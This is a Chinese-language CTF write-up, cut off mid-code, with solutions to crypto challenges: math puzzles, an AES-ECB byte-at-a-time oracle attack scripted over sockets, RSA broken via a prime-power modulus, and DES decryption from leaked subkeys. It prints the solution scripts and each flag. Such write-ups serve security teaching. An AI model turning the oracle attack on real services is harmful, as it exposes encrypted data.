<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="0x04-puzzles"><a href="#0x04-puzzles" class="headerlink" title="0x04 puzzles"></a>0x04 puzzles</h2><p><strong>操作过程：</strong><br>question 0：扔进wolframalpha里解一下<br><img src="https://upload-images.jianshu.io/upload_images/11234137-78b7175aeefede7e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p>question 1：给了4个，有三个数，试着搜一下，发现一个网站<a href="http://prime389.blog70.fc2.com/?m&amp;no=101" target="_blank" rel="noopener">http://prime389.blog70.fc2.com/?m&amp;no=101</a>，发现全是素数，写个代码看下位置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a=&apos;&apos;&apos;</span><br><span class="line"> 26364809, 26364823, 26364827, 26364847, 26364881, 26364889, 26364893, 26364901, 26364931, 26364941, 26364967, 26364983, 26364991, 26364997, 26365007, 26365021, 26365037, 26365039, 26365049, 26365057, 26365081, 26365099, 26365109, 26365111, 26365123, 26365133, 26365139, 26365169, 26365177, 26365187, 26365231, 26365243, 26365289, 26365301, 26365333, 26365363, 26365393, 26365399, 26365403, 26365421, 26365463, 26365511, 26365517, 26365519, 26365523, 26365541, 26365561, 26365601, 26365607, 26365621, 26365643, 26365649, 26365681, 26365721, 26365733, 26365741, 26365771, 26365777, 26365783, 26365789, 26365799, 26365811, 26365817, 26365819, 26365873, 26365877, 26365883, 26365891, 26365909, 26365943, 26365987, 26365991, 26366003, 26366023, 26366033, 26366059, 26366071, 26366077, 26366117, 26366141, 26366147, 26366149, 26366159, 26366173, 26366189, 26366203, 26366227, 26366231, 26366233, 26366273, 26366287, 26366317, 26366323, 26366341, 26366369, 26366383, 26366393, 26366407, 26366419, 26366429, 26366447, 26366453, 26366477, 26366491, 26366497, 26366503, 26366537, 26366551, 26366581, 26366591, 26366603, 26366621</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">print(a.replace(&quot;\n&quot;,&quot;&quot;).replace(&quot; &quot;,&quot;&quot;).split(&quot;,&quot;).index(&apos;26364809&apos;))</span><br><span class="line">print(a.replace(&quot;\n&quot;,&quot;&quot;).replace(&quot; &quot;,&quot;&quot;).split(&quot;,&quot;).index(&apos;26366033&apos;))</span><br><span class="line">print(a.replace(&quot;\n&quot;,&quot;&quot;).replace(&quot; &quot;,&quot;&quot;).split(&quot;,&quot;).index(&apos;26366621&apos;))</span><br></pre></td></tr></table></figure>
<p>发现可能是等差数列，推测是26365399<br>question 2：高数题，队内学霸做一下就好了，7700<br>question 3：大物题，磁通量Φ=BS=B<em>pi</em>r<em>r=16pi<br>电动势E=(delta Φ)/(delta t)=2</em>pi<em>r</em>B<em>(dr/dt)=80</em>pi=(part3*pi)/233<br>part3=18640<br>question 4：高数题，搜题软件搜一下，得到结果，part4=40320<br><strong>FLAG值：</strong><br>flag{01924dd7-1e14-48d0-9d80-fa6bed9c7a00}</p>
<h2 id="0x05-warmup"><a href="#0x05-warmup" class="headerlink" title="0x05 warmup"></a>0x05 warmup</h2><p><strong>操作内容：</strong><br> 安恒杯10月份一道密码原题，通过nc我们可以得到(我们输入明文)的AES或者(我们输入的明文+flag)的AES。本题的AES加密为ECB，16个字符为一组。所以我们考虑一下问题：假设flag为flag{xxxxxxxxx}。当我们输入123456789012345的时候，输入的个数为15位，这样flag里面的内容就需要向前补一位，实际上第一组加密的字符串可能是123456789012345f。然后我们再加密123456789012345f，如果两次加密的前16位得出的结果一样的话，这就证明flag的第一位就是f。我们先试验一下。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-cbba75568e12ed83.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p> 然后就可以编写脚本跑了，脚本如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">    HOST = &apos;08560bfda40f2691789fc1b246a80c4e.kr-lab.com&apos;</span><br><span class="line">    PORT = 54321</span><br><span class="line">    s = None</span><br><span class="line">    sock = socket.socket()</span><br><span class="line">    sock.connect((HOST,PORT))</span><br><span class="line">    szBuf = sock.recv(1024)</span><br><span class="line">    print(szBuf)</span><br><span class="line">    t=str(2222222222222)+&apos;\n&apos;</span><br><span class="line">    b1=t.encode(encoding=&apos;utf-8&apos;)</span><br><span class="line">    sock.send(b1)</span><br><span class="line">    szBuf = sock.recv(1024)</span><br><span class="line">    print(szBuf)</span><br><span class="line">    t=str(&apos;1234567890&apos;)+&apos;\n&apos;</span><br><span class="line">    b1=t.encode(encoding=&apos;utf-8&apos;)</span><br><span class="line">    sock.send(b1)</span><br><span class="line">    szBuf = sock.recv(1024)</span><br><span class="line">    print(szBuf)</span><br><span class="line">    print szBuf</span><br><span class="line">    temp=&apos;&#123;-1234567890&#125;abcdefghijklmnopqrstuvwxyz_?#@!&apos;</span><br><span class="line">    payload=str(&apos;00000000000000000000000000000000012345678912345&apos;)</span><br><span class="line">    </span><br><span class="line">    x=&apos;&apos;</span><br><span class="line">    for j in range(1,60):</span><br><span class="line">        for i in temp:</span><br><span class="line">            print i</span><br><span class="line">            t=(str(payload)+&apos;\n&apos;).encode(encoding=&apos;utf-8&apos;)</span><br><span class="line">            print &quot;-----------&quot;</span><br><span class="line">            print payload</span><br><span class="line">            print payload+x+i</span><br><span class="line">            print &quot;-----------&quot;</span><br><span class="line">            sock.send(t)</span><br><span class="line">            szBuf = sock.recv(1024)</span><br><span class="line">            xxx = str(szBuf[0:103])</span><br><span class="line">            ppp=payload+x+i+&apos;\n&apos;</span><br><span class="line">            p = ppp.encode(encoding=&apos;utf-8&apos;)</span><br><span class="line">            sock.send(p)</span><br><span class="line">            szBuf = sock.recv(1024)</span><br><span class="line">            yyy = str(szBuf[0:103])</span><br><span class="line">            if cmp(xxx, yyy) == 0:</span><br><span class="line">                print x+&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span><br><span class="line">                x=x+i</span><br><span class="line">                payload=payload[0:47-j]</span><br><span class="line">                print payload</span><br><span class="line">                break</span><br></pre></td></tr></table></figure>
<p>flag有点长，循环范围扩了好几次，，最终得到flag<br><img src="https://upload-images.jianshu.io/upload_images/11234137-eb8f1d39d53a2da2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p><strong>FLAG值：</strong><br>flag{9063a267-25ae-45a3-9c6e-62c0eb1db2e9}</p>
<h2 id="0x06-Asymmetric"><a href="#0x06-Asymmetric" class="headerlink" title="0x06 Asymmetric"></a>0x06 Asymmetric</h2><p><strong>操作内容：</strong><br>刚开始的题目不对，给的py文件中导入了flag但是没用到，以为有什么骚操作，这个题和普通阿RSA稍微有点区别，d给的不太明显，gmpy2.iroot求出来p，求解p的时候，n可以开2次方和4次方，最终测得4次方有效，然后求d，直接解密即可，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import random</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">import base64</span><br><span class="line">e=58134567416061346246424950552806959952164141873988197038339318172373514096258823300468791726051378264715940131129676561677588167620420173326653609778206847514019727947838555201787320799426605222230914672691109516799571428125187628867529996213312357571123877040878478311539048041218856094075106182505973331343540958942283689866478426396304208219428741602335233702611371265705949787097256178588070830596507292566654989658768800621743910199053418976671932555647943277486556407963532026611905155927444039372549162858720397597240249353233285982136361681173207583516599418613398071006829129512801831381836656333723750840780538831405624097443916290334296178873601780814920445215584052641885068719189673672829046322594471259980936592601952663772403134088200800288081609498310963150240614179242069838645027877593821748402909503021034768609296854733774416318828225610461884703369969948788082261611019699410587591866516317251057371710851269512597271573573054094547368524415495010346641070440768673619729280827372954003276250541274122907588219152496998450489865181536173702554116251973661212376735405818115479880334020160352217975358655472929210184877839964775337545502851880977049299029101466287659419446724781305689536816523774995178046989696610897508786776845460908137698543091418571263630383061605011820139755322231913029643701770497299157169690586232187419462594477116374977216427311975598620616618808494138669546120288334682865354702356192972496556372279363023366842805886601834278434406709218165445335977049796015123909789363819484954615665668979L</span><br><span class="line">n=754600786340927688096652328072061561501667781193760284816393637647032362908189628005150802929636396969230958922073774180726205402897453096041624408154494621307262657492560975357997726055874834308239749992507552325614973631556754707427580134609221878324704469965450463088892083264951442562525825243127575048386573246756312509362222667015490013299327398464802116909245529065994770788125182846841016932803939806558559335886481214931253578226314057242462834149031625361286317307273138514126289052003214703248070256059405676891634792175775697355408418965738663732479622148276007308404691800186837579126431484536836513358124181380166971922188839934522356902295160649189850427580493328509329115798694580347461641487270793993129066433242544366683131231903590153844590595882428219010673818765995719694470668924781499987923250883546686344997580959954960334567874040563037167422839228466141912000421309282727363913908613116739074234989825489075148091144771967111113068647060175231126374070143480727000247378471525286907200601035581143391602569836131345909055708005758380081303860198696570649330092070410465978479841469533490522594827330661914537170063053059393550673731195548189192109328158876774080143171304333338291909598353550442855717204721L</span><br><span class="line"># n=p**r</span><br><span class="line">p=gmpy2.iroot(n,2)</span><br><span class="line">print p</span><br><span class="line">p=27469997931214477761614767108186031567315036376083132392426996667627218749539695067248042591583909179084701435672160685775817300735625565681316931013796736475063262607704602169127345932808228340127651954510616128241670424036014879415455623394081339453271845448205451563064839423245503714379366851744076108861445013040104633032165239781810818675751597470203543193701129345733547475908441315395948934439272351686827840533139470474080751283584826092493989661762657864506486606709856249052957276749808634865316990803862670123015171486148705503812500313554891199205784097280219458478633286017402718458309597972808845785689L</span><br><span class="line">p1=165740755190793304655854506052794072378181046252118367693457385632818329041540419488625472007710062128632942664366383551452498541560538744582922713808611320176770401587674618121885719953831122487280978418110380597358747915420928053860076414097300832349400288770613227105348835005596365488460445438176193451867L</span><br><span class="line">print gmpy2.gcd(e,p)</span><br><span class="line">print p1**4-p1**3</span><br><span class="line">c=&apos;&apos;&apos;YXmuOsaD1W4poLAG2wPrJ/nYZCkeOh2igCYKnZA6ecCeJadT6B3ZVTciPN6LJ8AcAsRXNnkC6+9P</span><br><span class="line">NJPhmosSG5UGGbpIcg2JaZ1iA8Sm3fGiFacGvQsJOqqIWb01rjaQ3rDBKB331rrNo9QNOfMnjKr0</span><br><span class="line">ejGG+dNObTtvnskICbYbNnSxMxLQF57H5JnWZ3LbbKQ493vmZzwvC6iH8blNPAp3dBlVzDqIAmxm</span><br><span class="line">Ubk0OzFjPoHphD1oxHdzXyQNW+sLxVldrf9xcItq92jN5sqBYrG8wADIqY1/sqhTMZvkIYFMHqoM</span><br><span class="line">QuiRSnVrCF2h2RtGDEayLo0evgXI/0W3YveyKCHViOnG6wypcBFm91ZWdjp3fVW/4DyxW6xu9hg/</span><br><span class="line">NlXyRP6pT/OyQpcyTqKRuiXJLWgFUJI/8TRgyAjBLLgSd3U0N3VM8kewXw5j+fMUTCW9/Gy4iP8m</span><br><span class="line">52Zabx/vEKdwdGZ0QyvgvAWGUFZ96EK0g1BM/LU9Tuu2R+VKcCSCprg283x6NfYxmU26KlQE6Zrr</span><br><span class="line">jLmbCOe0327uaW9aDbLxZytPYIE5ZkzhSsD9JpQBKL30dCy3UKDbcuNgB6SrDddrbIuUd0/kLxuw</span><br><span class="line">h6kTqNbC4NDrOT4WAuP4se8GGOK8Wz0dL6rE6FkzMnI4Qg501MTSNQZ4Bp7cNf6H9lTa/4DNOl0=&apos;&apos;&apos;</span><br><span class="line">d=gmpy2.invert(e,p1**4-p1**3)</span><br><span class="line">print long_to_bytes(pow(bytes_to_long(base64.b64decode(c)),d,n))</span><br></pre></td></tr></table></figure></p>
<p><strong>FLAG值：</strong><br>flag{ec33f669d2d659e2bc27dbffdfeb0f38}</p>
<h2 id="0x07-Simple"><a href="#0x07-Simple" class="headerlink" title="0x07 Simple"></a>0x07 Simple</h2><p><strong>操作内容：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Round n part_encode-&gt; 0x92d915250119e12b </span><br><span class="line">Key map -&gt; 0xe0be661032d5f0b676f82095e4d67623628fe6d376363183aed373a60167af537b46abc2af53d97485591f5bd94b944a3f49d94897ea1f699d1cdc291f2d9d4a5c705f2cad89e938dbacaca15e10d8aeaed90236f0be2e954a8cf0bea6112e84</span><br></pre></td></tr></table></figure></p>
<p> 根据问题的txt内容，我们尝试以下步骤：</p>
<ol>
<li><p>猜测part_encode是加密到第n轮的密文，key map是16个subkey集合。由此，我们得到subkey集合：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">subkey = []</span><br><span class="line">for i in range(16):</span><br><span class="line">    sub = keymap[6*i: 6+6*i]</span><br><span class="line">    subkey.append(str_to_bit(sub)) #得到子密钥</span><br></pre></td></tr></table></figure>
</li>
<li><p>我们设参数n，表示part_encode是加密到第n轮的密文。</p>
</li>
<li>要得到flag，我们需要进行16-n轮的解密。由于part_encode是加密到第n轮的密文，所以我们不需要对前n轮的密文解密，只需要使用第n轮到第16轮的密钥进行解密。<br>以下为主函数：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    for n in range(15): #猜测n</span><br><span class="line">        part_encode = &apos;92d915250119e12b&apos;.decode(&apos;hex&apos;)</span><br><span class="line">        keymap = &apos;e0be661032d5f0b676f82095e4d67623628fe6d376363183aed373a60167af537b46abc2af53d97485591f5bd94b944a3f49d94897ea1f699d1cdc291f2d9d4a5c705f2cad89e938dbacaca15e10d8aeaed90236f0be2e954a8cf0bea6112e84&apos;.decode(&apos;hex&apos;)</span><br><span class="line">        subkey = []</span><br><span class="line">        for i in range(16):</span><br><span class="line">            sub = keymap[6*i: 6+6*i]</span><br><span class="line">            subkey.append(str_to_bit(sub)) #得到子密钥</span><br><span class="line">        crypto=str_to_bit(part_encode)</span><br><span class="line">        l, r = split(crypto, 32) </span><br><span class="line">        r, l = split(crypto, 32) </span><br><span class="line">        result = []</span><br><span class="line">        #开始解密</span><br><span class="line">        for i in range(16): </span><br><span class="line">            if i &lt; n: #不使用前n轮的子密钥解密</span><br><span class="line">                continue</span><br><span class="line">            r_ebox = get_across_ebox(r) </span><br><span class="line">            r_xor = xor(subkey[15-i], r_ebox)</span><br><span class="line">            r_sbox = get_across_sbox(r_xor) </span><br><span class="line">            r_pbox = get_across_pbox(r_sbox)</span><br><span class="line">            r_xor1 = xor(l, r_pbox)</span><br><span class="line">            l = r</span><br><span class="line">            r = r_xor1</span><br><span class="line">        result = result+ final_transposition(r+l)</span><br><span class="line">        final = bit_to_str(result)  </span><br><span class="line">        print (&quot;flag&#123;%s&#125;&quot;%final) #输出结果</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>完整代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line">from io import *</span><br><span class="line">import re</span><br><span class="line">from binascii import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#PC-1变换矩阵,输出56个比特位</span><br><span class="line">PC_1= [57, 49, 41, 33, 25, 17, 9,</span><br><span class="line">        1, 58, 50, 42, 34, 26, 18,</span><br><span class="line">        10, 2, 59, 51, 43, 35, 27,</span><br><span class="line">        19, 11, 3, 60, 52, 44, 36,</span><br><span class="line">        63, 55, 47, 39, 31, 23, 15,</span><br><span class="line">        7, 62, 54, 46, 38, 30, 22,</span><br><span class="line">        14, 6, 61, 53, 45, 37, 29,</span><br><span class="line">        21, 13, 5, 28, 20, 12, 4]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#LSC，密钥左移次数</span><br><span class="line">LSC_num=[1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#PC-2变换矩阵，输出48个比特位</span><br><span class="line">PC_2= [14, 17, 11, 24, 1, 5, 3, 28,</span><br><span class="line">       15, 6, 21, 10, 23, 19, 12, 4,</span><br><span class="line">       26, 8, 16, 7, 27, 20, 13, 2,</span><br><span class="line">       41, 52, 31, 37, 47, 55, 30, 40,</span><br><span class="line">       51, 45, 33, 48, 44, 49, 39, 56,</span><br><span class="line">       34, 53, 46, 42, 50, 36, 29, 32]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Initial Transposition,输出64个比特位</span><br><span class="line">IT= [58, 50, 42, 34, 26, 18, 10, 2,</span><br><span class="line">     60, 52, 44, 36, 28, 20, 12, 4,</span><br><span class="line">     62, 54, 46, 38, 30, 22, 14, 6,</span><br><span class="line">     64, 56, 48, 40, 32, 24, 16, 8,</span><br><span class="line">     57, 49, 41, 33, 25, 17, 9, 1,</span><br><span class="line">     59, 51, 43, 35, 27, 19, 11, 3,</span><br><span class="line">     61, 53, 45, 37, 29, 21, 13, 5,</span><br><span class="line">     63, 55, 47, 39, 31, 23, 15, 7]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#EBox，输出48个比特位</span><br><span class="line">EBox= [32, 1, 2, 3, 4, 5,</span><br><span class="line">        4, 5, 6, 7, 8, 9,</span><br><span class="line">        8, 9, 10, 11, 12, 13,</span><br><span class="line">        12, 13, 14, 15, 16, 17,</span><br><span class="line">        16, 17, 18, 19, 20, 21,</span><br><span class="line">        20, 21, 22, 23, 24, 25,</span><br><span class="line">        24, 25, 26, 27, 28, 29,</span><br><span class="line">        28, 29, 30, 31, 32, 1]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#SBox,box1-box8,输出32个比特位</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SBox1=[[14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7],</span><br><span class="line">         [0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8],</span><br><span class="line">         [4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0],</span><br><span class="line">         [15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SBox2=[[15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10],</span><br><span class="line">         [3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5],</span><br><span class="line">         [0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15],</span><br><span class="line">         [13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SBox3=[[10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8],</span><br><span class="line">         [13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1],</span><br><span class="line">         [13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7],</span><br><span class="line">         [1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SBox4=[[7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15],</span><br><span class="line">         [13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9],</span><br><span class="line">         [10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4],</span><br><span class="line">         [3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SBox5=[[2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9],</span><br><span class="line">         [14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6],</span><br><span class="line">         [4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14],</span><br><span class="line">         [11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SBox6=[[12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11],</span><br><span class="line">         [10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8],</span><br><span class="line">         [9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6],</span><br><span class="line">         [4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SBox7=[[4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1],</span><br><span class="line">         [13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6],</span><br><span class="line">         [1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2],</span><br><span class="line">         [6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SBox8=[[13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7],</span><br><span class="line">         [1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2],</span><br><span class="line">         [7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8],</span><br><span class="line">         [2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11]]</span><br><span class="line">SBox=[SBox1,SBox2,SBox3,SBox4,SBox5,SBox6,SBox7,SBox8]</span><br><span class="line">#PBox，输出32个比特位</span><br><span class="line">PBox= [16, 7, 20, 21, 29, 12, 28, 17,</span><br><span class="line">       1, 15, 23, 26, 5, 18, 31, 10,</span><br><span class="line">       2, 8, 24, 14, 32, 27, 3, 9,</span><br><span class="line">       19, 13, 30, 6, 22, 11, 4, 25]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Final Transposition，输出64个比特位</span><br><span class="line">FT=[40, 8, 48, 16, 56, 24, 64, 32,</span><br><span class="line">    39, 7, 47, 15, 55, 23, 63, 31,</span><br><span class="line">    38, 6, 46, 14, 54, 22, 62, 30,</span><br><span class="line">    37, 5, 45, 13, 53, 21, 61, 29,</span><br><span class="line">    36, 4, 